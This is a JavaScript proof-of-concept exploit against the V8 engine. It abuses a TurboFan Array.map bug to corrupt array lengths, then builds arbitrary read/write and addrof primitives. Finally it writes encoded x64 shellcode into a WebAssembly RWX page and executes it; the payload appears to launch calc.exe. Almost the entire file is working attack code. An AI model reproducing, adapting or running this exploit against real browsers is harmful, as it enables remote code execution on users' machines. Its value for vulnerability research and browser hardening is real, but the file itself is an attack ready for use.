// HELPER FUNCTIONS
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

// *******************
// Exploit starts here
// *******************
// This call ensures that TurboFan won't inline array constructors.
Array(2**30);

// we are aiming for the following object layout
// [output of Array.map][packed float array][typed array][Object]
// First the length of the packed float array is corrupted via the original vulnerability,
// then the float array can be used to modify the backing store of the typed array, thus achieving AARW.
// The Object at the end is used to implement addrof

// offset of the length field of the float array from the map output
const float_array_len_offset = 23;
// offset of the length field of the typed array
const tarray_elements_len_offset = 24;
// offset of the address pointer of the typed array
const tarray_elements_addr_offset = tarray_elements_len_offset + 1;
const obj_prop_b_offset = 33;

// Set up a fast holey smi array, and generate optimized code.
let a = [1, 2, ,,, 3];
let cnt = 0;
var tarray;
var float_array;
var obj;

function mapping(a) {
  function cb(elem, idx) {
    if (idx == 0) {
      float_array = [0.1, 0.2];

      tarray = new BigUint64Array(2);
      tarray[0] = 0x41414141n;
      tarray[1] = 0x42424242n;
      obj = {'a': 0x31323334, 'b': 1};
      obj['b'] = obj;
    }

    if (idx > float_array_len_offset) {
      // minimize the corruption for stability
      throw "stop";      
    }
    return idx;
  }
  
  return a.map(cb);
}

function get_rw() {
  for (let i = 0; i < 10 ** 5; i++) {
    mapping(a);
  }

  // Now lengthen the array, but ensure that it points to a non-dictionary
  // backing store.
  a.length = (32 * 1024 * 1024)-1;
  a.fill(1, float_array_len_offset, float_array_len_offset+1);
  a.fill(1, float_array_len_offset+2);

  a.push(2);
  a.length += 500;

  // Now, the non-inlined array constructor should produce an array with
  // dictionary elements: causing a crash.
  cnt = 1;
  try {
    mapping(a);
  } catch(e) {
    // relative RW from the float array from this point on
    let sane = sanity_check()
    console.log('sanity_check == ', sane);
    console.log('len+3: ' + float_array[tarray_elements_len_offset+3].f2i().toString(16));
    console.log('len+4: ' + float_array[tarray_elements_len_offset+4].f2i().toString(16));
    console.log('len+8: ' + float_array[tarray_elements_len_offset+8].f2i().toString(16));

    let original_elements_ptr = float_array[tarray_elements_len_offset+1].f2i() - 1n;
    console.log('original elements addr: ' + original_elements_ptr.toString(16));
    console.log('original elements value: ' + read8(original_elements_ptr).toString(16));
    console.log('addrof(Object): ' + addrof(Object).toString(16));
  }
}

function sanity_check() {
  success = true;
  success &= float_array[tarray_elements_len_offset+3].f2i() == 0x41414141;
  success &= float_array[tarray_elements_len_offset+4].f2i() == 0x42424242;
  success &= float_array[tarray_elements_len_offset+8].f2i() == 0x3132333400000000;
  return success;
}

function read8(addr) {
  let original = float_array[tarray_elements_len_offset+1];
  float_array[tarray_elements_len_offset+1] = (addr - 0x1fn).i2f();
  let result = tarray[0];
  float_array[tarray_elements_len_offset+1] = original;
  return result;
}

function write8(addr, val) {
  let original = float_array[tarray_elements_len_offset+1];
  float_array[tarray_elements_len_offset+1] = (addr - 0x1fn).i2f();
  tarray[0] = val;
  float_array[tarray_elements_len_offset+1] = original;
}

function addrof(o) {
  obj['b'] = o;
  return float_array[obj_prop_b_offset].f2i();

}

var wfunc = null;
let shellcode = unescape("%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065")

function get_wasm_func() {
  var importObject = {
      imports: { imported_func: arg => console.log(arg) }
  };
  bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
  wasm_code = new Uint8Array(bc);
  wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
  return wasm_mod.exports.exported_func;
}

function rce() {
  let wasm_func = get_wasm_func();
  wfunc = wasm_func;
  console.log('wasm: ' + wfunc);
  // traverse the JSFunction object chain to find the RWX WebAssembly code page
  let wasm_func_addr = addrof(wasm_func) - 1n;
  console.log('wasm: ' + wfunc);

  let sfi = read8(wasm_func_addr + 12n*2n) - 1n;
  console.log('sfi: ' + sfi.toString(16));
  let WasmExportedFunctionData = read8(sfi + 4n*2n) - 1n;
  console.log('WasmExportedFunctionData: ' + WasmExportedFunctionData.toString(16));

  let instance = read8(WasmExportedFunctionData + 8n*2n) - 1n;
  console.log('instance: ' + instance.toString(16));

  // let rwx_addr = read8(instance + 0x108n);
  let rwx_addr = read8(instance + 0xf8n);
  console.log('rwx: ' + rwx_addr.toString(16));

  // write the shellcode to the RWX page
  if (shellcode.length % 2 != 0)
  shellcode += "\u9090";  

  for (let i = 0; i < shellcode.length; i += 2) {
    write8(rwx_addr + BigInt(i*2), BigInt(shellcode.charCodeAt(i) + shellcode.charCodeAt(i + 1) * 0x10000));
  }

  // invoke the shellcode
  wfunc();
}


function exploit() {
  get_rw();
  rce();
}

